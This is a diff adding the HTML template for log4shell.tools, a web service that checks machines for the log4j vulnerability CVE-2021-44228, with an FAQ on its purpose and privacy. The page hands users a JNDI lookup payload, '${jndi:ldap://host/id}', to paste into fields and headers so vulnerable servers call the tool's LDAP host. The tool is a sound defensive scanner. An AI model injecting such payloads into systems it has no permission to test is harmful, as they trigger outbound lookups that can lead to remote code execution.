@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Log4Shell Test (CVE-2021-44228)</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    {{ if .Test }}
+      {{ if not (IsTestDone .Test) }}
+        <meta http-equiv="refresh" content="5">
+      {{ end }}
+    {{ end }}
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+    <style>
+      .content {
+        padding-top: 35px;
+        max-width: 1100px;
+        margin: 0 auto;
+        padding-bottom: 150px;
+        padding-right: 10px;
+        padding-left: 10px;
+      }
+      footer {
+        max-width: 1100px;
+        margin: 0 auto;
+        padding-right: 10px;
+        padding-left: 10px;
+      }
+      th {
+        white-space: nowrap;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="content">
+      <div class="position-fixed bottom-0 end-0 p-3" style="z-index: 100">
+        <div class="toast hide align-items-center" role="alert" aria-live="assertive" aria-atomic="true">
+          <div class="d-flex">
+            <div class="toast-body">
+              Copied to the clipboard
+            </div>
+            <button type="button" class="btn-close me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
+          </div>
+        </div>
+      </div>
+      <div class="container-fluid">
+        <div class="row">
+          <div class="col">
+            <h1><a class="text-decoration-none" href="/">log4shell.tools</a></h1>
+            <p>This tool allows you to run a test to check whether one of your machines is affected by a vulnerability in log4j: <b>CVE-2021-44228</b>. You must only use this tool on machines that you have permission to test on.</p>
+            <form method="GET" action="/">
+              <div class="mb-3">
+                <label for="input-uuid" class="form-label">Test ID</label>
+                <input type="text" class="form-control" name="uuid" id="input-uuid" value="{{ .UUID }}" readonly>
+              </div>
+              <div class="mb-3 form-check">
+                <input class="form-check-input" type="checkbox" value="y" name="terms" id="input-terms" required {{ if .Test }}checked disabled{{ end }}>
+                <label class="form-check-label" for="input-terms">
+                  I'm testing a device that I personally own, or a device for which I have permission from the owner to run this test
+                </label>
+              </div>
+              <input class="btn btn-primary" type="submit" value="Start" {{ if .Test }}disabled{{ end }}>
+            </form>
+          </div>
+        </div>
+        {{ if .Test }}
+        <div class="row">
+          <div class="col">
+            <h2 class="mt-5">
+              {{ if IsTestDone .Test }}
+                Finished
+                {{ if IsTestTimedOut .Test }}
+                  <span class="fs-6"> (The test timed out)</span>
+                {{ end }}
+              {{ else }}
+                <div class="spinner-border text-primary fs-6" role="status">
+                  <span class="visually-hidden">Waiting...</span>
+                </div>
+                Waiting
+              {{ end }}
+            </h2>
+            {{ if not (IsTestDone .Test) }}
+              <label for="input-uri" class="form-label">Copy the text below and paste it anywhere you suspect it might end up being sent to log4j:</label>
+              <div class="mb-3 input-group">
+                <input type="text" class="form-control fw-bold" id="input-uri" value="${jndi:ldap://{{ .AddrLDAPExternal }}/{{ .Test.ID }}}" readonly>
+                <button class="btn btn-outline-dark" id="button-input-uri" type="button">Copy</button>
+              </div>
+            {{ end }}
+            <div class="alert alert-primary" role="alert">
+              If any entries appear in the log below, you should immediately take action to
+              <a href="https://logging.apache.org/log4j/2.x/security.html#Fixed_in_Log4j_2.15.0">mitigate the vulnerability</a>. Test results are permanently deleted after 24 hours.
+            </div>
+            <div class="table-responsive">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th scope="col">Time</th>
+                    <th scope="col">Type</th>
+                    <th scope="col">Source</th>
+                    <th scope="col">Message</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  {{ range $val := (GetTestResults .Context .Test) }}
+                    <tr class="table-{{ $val.Color }}">
+                      <th scope="row">{{ $val.Created.Format "2006-01-02 15:04:05" }}</th>
+                      <td>{{ $val.Type }}</td>
+                      <td>{{ if $val.Ptr }}{{ $val.Ptr }}{{ else }}{{ $val.Addr }}{{ end }}</td>
+                      {{ if eq $val.Type "recv_ldap_search" }}
+                        <td>
+                          LDAP search query received. At the very least, your log4j deployment supports doing lookups.
+                        </td>
+                      {{ else if eq $val.Type "recv_http_get" }}
+                        <td>
+                          GET request for RCE payload payload received.
+                        </td>
+                      {{ else if eq $val.Type "recv_http_post" }}
+                        <td>
+                          POST request from RCE payload received. This means that the tool was able to execute code on one of your machines!
+                        </td>
+                      {{ end }}
+                    </tr>
+                  {{ end }}
+                </tbody>
+              </table>
+              <p><i>Timestamps are in UTC.</i></p>
+            </div>
+          </div>
+        </div>
+        {{ end }}
+        <div class="row">
+          <div class="col">
+            <h2 class="mt-5">FAQ</h2>
+            <p>I've compiled a short list of frequently asked questions to start with. I'll add new ones as they come in.</p>
+            <h5>What is CVE-2021-44228?</h5>
+            <p>
+              <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">CVE-2021-44228</a>
+              is a vulnerability in the popular log4j library by Apache. In the
+              worst case, it allows bad actors to execute code on any server
+              where they're able to get log4j to process a malicious log
+              message.
+            </p>
+            <p>
+              If you're using log4j or a product that depends on log4j, you should act on this immediately.
+            </p>
+            <h5>What can I do to protect myself?</h5>
+            <p>Please read the official advisory from Apache: <a href="https://logging.apache.org/log4j/2.x/security.html#Fixed_in_Log4j_2.15.0">https://logging.apache.org/log4j/2.x/security.html#Fixed_in_Log4j_2.15.0</a>.</p>
+            <h5>What does this tool do?</h5>
+            <p>
+              The tool generates a unique ID for you to test with. After you
+              click start, we'll generate a piece of text for you that looks
+              similar to this: <b>${jndi:ldap://log4shell.tools:12345/id}</b>.
+              Copy it and paste it anywhere you suspect it might end up getting
+              passed through log4j. For example: search boxes, form fields or
+              HTTP headers.
+            </p>
+            <p>
+              Once an outdated version of log4j sees this string, it will
+              perform an LDAP search request to <b>log4shell.tools:12345</b>.
+              The tool responds with a Java class description, along with a URL
+              for where to obtain it. Log4j may even attempt to fetch the class file. The
+              tool will return a 404 and conclude the test.
+            </p>
+            <h5>Am I safe if the tool doesn't report anything after the test?</h5>
+            <p>
+              Not necessarily. If the machine you're testing on does not have
+              access to the internet or can't reach <b>log4shell.tools</b> for
+              some other reason, the results will not be accurate. The tool is
+              only meant to give you a rough assessment of what someone with no
+              special access to your environment would be able to do.
+            </p>
+            <p>
+              The only way to make sure you're safe, is to start applying
+              patches.
+            </p>
+            <h5>Isn't releasing such a tool to the public dangerous?</h5>
+            <p>
+              I believe in arming the public with the same tools that the bad
+              actors we're up against already have. Especially in this case
+              where the vulnerability is so trivial to exploit. Anyone with some
+              decent Google-fu will be able to find a full PoC (including RCE)
+              within minutes. The goal is to contribute to leveling the playing
+              field by allowing anyone to perform a rough assessment of how
+              vulnerable they are to this log4j vulnerability.
+            </p>
+            <p>
+              Especially if your product runs on a service where you don't have
+              enough access to update log4j or change its options, a test result
+              from a tool like this might be enough to get the attention of the
+              right people.
+            </p>
+            <h5>Does this tool perform RCE (remote code execution)?</h5>
+            <p>
+              No. It runs the exploit right up until your device requests the
+              RCE payload, then it returns a 404 and concludes the test.
+            </p>
+            <h5>What is the privacy policy?</h5>
+            <p>
+              The tool stores test results, IP addresses and PTR records of the servers
+              that reach out to it. All test results and any information
+              collected along with it is automatically permanently deleted
+              after 24 hours.
+            </p>
+            <p>
+              No information is shared with third parties. To ensure the privacy
+              of your test results, do not share your unique test ID with anyone
+              else.
+            </p>
+            <h5>Is this tool open source?</h5>
+            <p>
+              Not yet! There is some work to do to clean the code up, but I hope
+              to make this tool open source somewhere in the next couple of days. The
+              goal is to give everyone the ability to set it up in their own
+              environment by running a single binary.
+            </p>
+            <h5>Is this tool affiliated with the Apache Software Foundation?</h5>
+            <p>No.</p>
+            <h5>I have another question / found an issue. How can I contact you?</h5>
+            <p>
+              Feel free to <a href="mailto:contact@alexbakker.me">send me an
+              email</a>. If you're reporting a security issue, please don't
+              discuss it in public before I've had an opportunity to fix it.
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+    <footer>
+      <div class="footer container-fluid py-4">
+        <p>Built by <a href="https://alexbakker.me" target="_blank">Alexander Bakker</a></p>
+      </div>
+    </footer>
+    <script>
+      window.addEventListener("DOMContentLoaded", (event) => {
+        const toastELems = [].slice.call(document.querySelectorAll(".toast"))
+        const toast = new bootstrap.Toast(toastELems[0]);
+
+        const uriInput = document.getElementById("input-uri");
+        const copyBtn = document.getElementById("button-input-uri");
+        copyBtn.addEventListener("click", () => {
+          navigator.clipboard.writeText(uriInput.value).then(function() {
+            toast.show()
+          }, function(err) {
+            console.error("Failed to copy to the clipboard", err);
+          });
+        });
+      });
+    </script>
+  </body>
+</html>
